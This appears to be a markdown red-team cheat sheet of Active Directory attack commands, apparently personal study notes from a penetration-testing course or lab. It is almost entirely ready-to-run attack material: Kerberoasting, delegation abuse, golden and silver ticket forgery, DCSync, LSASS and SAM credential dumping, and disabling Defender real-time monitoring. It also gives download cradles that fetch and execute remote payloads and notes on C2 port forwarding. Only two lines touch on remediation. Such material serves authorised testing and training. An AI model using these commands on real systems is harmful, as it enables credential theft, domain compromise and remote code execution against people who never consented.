# Active Directory attacks

## Privilege Escalation

+ PowerUp
+ BeRoot
+ Privesc

+ Missing patches
+ AutoLogon passwords
+ AlwaysInstallElevated
+ Misconfigured services
+ DLL hijacking
...

## User Hunting

```
Find-LocalAdminAccess -Verbose
Find-WMILocalAdminAccess -Verbose
Find-PSRemotingLocalAdminAccess -Verbose
Find-DomainUserLocation -Verbose
```

## Asreproast

```
Get-DomainUser -PreauthNotRequired
Rubeus.exe asreproast
```

## Kerberoast

```
Get-DomainUser -SPN
Rubeus.exe kerberoast
Set-DomainObject -Identity USER -Set @{serviceprincipalname='DOMAIN/SPN'}
```

## Restricted Groups/OUs

```
Get-DomainGPOLocalGroup
Get-NetGPOGroup
(Get-DomainOU -Identity IDENTITY).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
(Get-DomainOU -Identity IDENTITY).gplink
Get-DomainGPO -Identity '{FCE16496-C744-4E46-AC89-2D01D76EAD68}'
```

## LAPS

```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-MemberNoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
Get-DomainObject -Identity IDENTITY | select -ExpandProperty ms-mcs-admpwd
```

## Unconstrained Delegation

```
Get-DomainComputer -Unconstrained
MS-RPRN.exe \\TARGET.DOMAIN \\COMPROMISED-UNCONSTRAINED.DOMAIN

Rubeus.exe monitor /interval:5 /targetuser:TARGET$ /nowrap
Rubeus.exe ptt /ticket:BASE64-TICKET

sekurlsa::tickets /export
kerberos::ptt ticket.kirbi
```

## Constrained Delegation

```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
Rubeus.exe s4u /user:TRUSTED-SERVICE /aes256:AESKEY /impersonateuser:administrator /msdsspn:SERVICE/COMPUTER.DOMAIN /altservice:HTTP,HOST,CIFS /domain:DOMAIN /ptt
```

## Resource Based Constrained Delegation

+ GenericAll/GenericWrite on TARGET

```
Set-ADComputer -Identity TARGET -PrincipalsAllowedToDelegateToAccount COMPUTER$/SERVICE

$ComputerSid = Get-DomainComputer COMPUTER$/SERVICE -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

Rubeus.exe s4u /user:COMPUTER$/SERVICE /aes256:AESKEY /msdsspn:SERVICE/TARGET.DOMAIN /impersonateuser:administrator /ptt
```

## Exchange

+ MailSniper

```
Get-GlobalAddressList -ExchHostname EXCHANGE-COMPUTER -UserName DOMAIN\USER -Password PASSWORD -Verbose
Invoke-OpenInboxFinder -EmailList EMAIL.txt -ExchHostname EXCHANGE-COMPUTER -Verbose
Invoke-SelfSearch -Mailbox MAILBOX -ExchHostname EXCHANGE-COMPUTER -OutputCsv mails.csv
```

## AzureAD

```
Get-DomainUser -Domain DOMAIN | ?{$_.samAccountName -like 'MSOL_*'} | select SamAccountName,Description | fl
. .\adconnect.ps1
ADConnect
```

## MSSQL

+ PowerUpSQL
```
Get-SQLInstanceDomain
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
Get-SQLServerLink -Instance MSSQL-SERVER -Verbose
Get-SQLServerLinkCrawl -Instance MSSQL-SERVER -Verbose
Get-SQLServerLinkCrawl -Instance MSSQL-SERVER -Query 'exec master..xp_cmdshell ''COMMAND''' -QueryTarget SERVER
```
+ Enable RPC Out and `xp_cmdshell` on linked server from a MSSQL server:
```
Invoke-SqlCmd -Query "exec sp_serveroption @server='LINKED-SERVER', @optname='rpc', @optvalue='TRUE'"
Invoke-SqlCmd -Query "exec sp_serveroption @server='LINKED-SERVER', @optname='rpc out', @optvalue='TRUE'"
Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""LINKED-SERVER"""
Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""LINKED-SERVER"""
```

## Cross-domain
### Exchange

```
Get-DomainGroup *exchange* -Domain DOMAIN
Get-DomainGroupMember -Identity "Organization Management" -Domain DOMAIN -Verbose -Recurse
```

+ Organization Management -> GenericAll on Exchange Windows Permissions -> WriteDACL on domain object -> DCSync (takes a while)
+ Exchange Trusted Subsystem -> can modify DACL of DNSAdmins\*

### Unconstrained Delegation

+ works across domain!

### AzureAD

### Trust Key (SID history)
```

lsadump::dcsync /user:LEAF\ROOT$
lsadump::trust /patch
// inter-realm TGT
kerberos::golden /domain:DOMAIN /sid:DOMAIN-SID /sids:ROOT-SID-519 /aes256:TRUST-KEY /user:Administrator /service:krbtgt /target:ROOT-DOMAIN /ticket:trust.kirbi
Rubeus.exe asktgs /ticket:trust.kirbi /service:SERVICE/ROOT-DC /dc:ROOT-DC /ptt
```

### krbtgt (SID history)

```
kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN-SID /aes256:AESKEY-KRBTGT /sids:ROOT-SID-519 /ptt
```

## Cross-forest
### Kerberoast

### Unconstrained Delegation

+ only if TGT Delegation enabled on the trust!

### Trust Key

+ can only access resources explicitly shared!
+ SID filtering -> but SID >= 1000 OK for SID history!

### MSSQL

### FSPs/ACLs

```
Find-ForeignUser -Verbose
Find-ForeignGroup -Verbose
Get-DomainUser/Group -Domain TRUSTING-FOREST | ?{$_.ObjectSid -eq 'FOREIGN-SID'}
Find-InterestingDomainAcl -Domain TRUSTING-FOREST
```

### PAM Trust

+ usually between bastion/red forest and production forest
+ AD Module:
```
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
```

## AV/AppLocker

```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\Users\Public\lsass.dmp full
sekurlsa::minidump C:\AD\Tools\lsass.DMP
privilege::debug
sekurlsa::ekeys

reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
privilege::debug
lsadump::sam /sam:sam.hiv /system:system.hiv
```

## Impersonate

### runas

```
echo PASSWORD | runas /netonly /noprofile /user:USER COMMAND
```

### RDP

```
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

### PowerShell Remoting

```
winrs
$passwd = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("DOMAIN\USER", $passwd)
$sess = New-PSSession -ComputerName COMPUTER -Credential $creds
Enter-PSSession $sess
Invoke-Command -ScriptBlock {whoami} -ComputerName bla -Credential $creds
Invoke-Command -ScriptBlock {whoami} -Session $sess
Invoke-Command -FilePath SCRIPT.ps1 -Session $sess
```

### Over-PTH

```
Rubeus.exe asktgt /user:USER /aes256:AESKEY /ptt
sekurlsa::pth /user:USER /domain:DOMAIN /aes256:AESKEY /run:cmd.exe
Rubeus.exe asktgt /user:USER /aes256:AESKEY /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Golden Ticket

```
kerberos::golden /user:WHATEVER /domain:DOMAIN /sid:DOMAIN-SID /aes256:AESKEY-KRBTGT /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

### Silver Ticket

```
kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN-SID /target:TARGET-FQDN /service:SERVICE /aes256:AESKEY-TARGET /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

+ HOST -> schedule task
+ HOST,HTTP -> WinRM/PSRemoting
+ HOST,RPCSS -> WMI
+ CIFS -> file access
+ LDAP -> DCSync

## Creds

```
sekurlsa::ekeys
lsadump::dcsync /user:DOMAIN\krbtgt
```

## File transfer

### Download cradle

```
iex(New-ObjectNet.WebClient).DownloadString('https://webserver/payload.ps1')
iex(iwr'http://192.168.230.1/evil.ps1')
```

### xcopy+Loader

```
echo F | xcopy C:\AD\Tools\Loader.exe \\DOMAIN\COMPUTER\C$\SHARE\Loader.exe
Loader.exe -path http://SERVER/PROGRAM.exe
```

## Execution Policy

```
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand <b64u16cmd>
$env:PSExecutionPolicyPreference="bypass"
```

# Remediations

## Enumeration

+ NetCease
+ [SamRi10](https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b)


# Covenant

## Remote listener

Listener:
+ BindAddress -> covenant IP
+ ConnectAddress -> remote IP to be port forwarded
+ port forward:
```
netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=8080 connectaddress=COVENANT-IP
```

## Impersonate

+ MakeToken USER DOMAIN PASSWORD
+ asktgt /ptt

## PowerShell

+ PowershellImport

